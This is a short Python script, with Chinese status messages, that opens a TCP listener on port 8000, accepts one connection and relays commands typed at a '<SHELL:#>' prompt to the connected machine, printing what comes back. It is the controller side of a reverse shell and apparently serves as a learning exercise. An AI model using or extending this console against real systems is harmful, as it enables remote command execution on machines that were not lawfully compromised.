import socket

host = '0.0.0.0'

port = 8000

server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server_socket.bind((host,port))

server_socket.listen(5)

print('[+] 端口开放在 %d' % port)

client_socket , addr = server_socket.accept()

print('%s:%d 连接成功' % (addr[0],addr[1]))

while True:
    command = input("<SHELL:#>")
    if command == '':
        continue
    client_socket.send(command.encode())

    data = client_socket.recv(1024)

    print(data.decode('utf8','ignore'))

    if command == 'exit':
        break